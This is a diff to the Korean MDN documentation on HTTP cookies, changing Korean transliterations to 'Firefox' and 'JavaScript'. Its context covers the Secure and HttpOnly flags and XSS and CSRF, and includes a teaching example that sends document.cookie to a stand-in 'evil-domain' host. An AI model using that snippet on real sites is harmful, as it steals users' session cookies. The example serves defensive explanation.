@@ -75,7 +75,7 @@ Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
 
 ### `Secure`과 `HttpOnly` 쿠키
 
-Secure 쿠키는 HTTPS 프로토콜 상에서 암호화된(encrypted ) 요청일 경우에만 전송됩니다. 하지만 `Secure`일지라도 민감한 정보는 절대 쿠키에 저장되면 안됩니다, 본질적으로 안전하지 않고 이 플래그가 당신에게 실질적인 보안(real protection)를 제공하지 않기 때문입니다. 크롬52 혹은 파이어폭스52로 시작한다면, 안전하지 않은 사이트(`http:`) 는 쿠키에 `Secure` 설정을 지시할 수 없습니다.
+Secure 쿠키는 HTTPS 프로토콜 상에서 암호화된(encrypted ) 요청일 경우에만 전송됩니다. 하지만 `Secure`일지라도 민감한 정보는 절대 쿠키에 저장되면 안됩니다, 본질적으로 안전하지 않고 이 플래그가 당신에게 실질적인 보안(real protection)를 제공하지 않기 때문입니다. 크롬52 혹은 Firefox52로 시작한다면, 안전하지 않은 사이트(`http:`) 는 쿠키에 `Secure` 설정을 지시할 수 없습니다.
 
 Cross-site 스크립팅 ({{Glossary("XSS")}}) 공격을 방지하기 위해, `HttpOnly`쿠키는 JavaScript의 {{domxref("Document.cookie")}} API에 접근할 수 없습니다; 그들은 서버에게 전송되기만 합니다. 예를 들어, 서버 쪽에서 지속되고 있는 세션의 쿠키는 JavaScript를 사용할 필요성이 없기 때문에 `HttpOnly`플래그가 설정될 것입니다.
 
@@ -103,9 +103,9 @@ Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
 
 `SameSite` 쿠키는 쿠키가 cross-site 요청과 함께 전송되지 않았음을 요구하게 만들어, cross-site 요청 위조 공격({{Glossary("CSRF")}})에 대해 어떤 보호 방법을 제공합니다. `SameSite` 쿠키는 여전히 실험 중이며 모든 브라우저에 의해 아직 제공되지 않고 있습니다.
 
-### `Document.cookie`를 사용한 자바스크립트 접근
+### `Document.cookie`를 사용한 JavaScript 접근
 
-새로운 쿠키들은 {{domxref("Document.cookie")}}를 사용해 만들어질 수도 있으며, `HttpOnly` 플래그가 설정되지 않은 경우 기본의 쿠키들은 자바스크립트로부터 잘 접근될 수 있습니다.
+새로운 쿠키들은 {{domxref("Document.cookie")}}를 사용해 만들어질 수도 있으며, `HttpOnly` 플래그가 설정되지 않은 경우 기본의 쿠키들은 JavaScript로부터 잘 접근될 수 있습니다.
 
 ```js
 document.cookie = "yummy_cookie=choco";
@@ -114,7 +114,7 @@ console.log(document.cookie);
 // logs "yummy_cookie=choco; tasty_cookie=strawberry"
 ```
 
-아래 [보안](/ko/docs/Web/HTTP/Cookies#Security) 섹션에서 다루고 있는데로 보안 관련 내용들을 잘 알아두시기 바랍니다. 자바스크립트에서 이용 가능한 쿠키들은 XSS를 통해 감청될 수 있습니다.
+아래 [보안](/ko/docs/Web/HTTP/Cookies#Security) 섹션에서 다루고 있는데로 보안 관련 내용들을 잘 알아두시기 바랍니다. JavaScript에서 이용 가능한 쿠키들은 XSS를 통해 감청될 수 있습니다.
 
 ## 보안
 
@@ -129,7 +129,7 @@ new Image().src =
   "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
-`HttpOnly` 쿠키 속성은 자바스크립트를 통해 쿠키 값에 접근하는 것을 막아 이런 공격을 누그러뜨리는데 도움을 줄 수 있습니다.
+`HttpOnly` 쿠키 속성은 JavaScript를 통해 쿠키 값에 접근하는 것을 막아 이런 공격을 누그러뜨리는데 도움을 줄 수 있습니다.
 
 ### Cross-site 요청 위조 (CSRF)
 
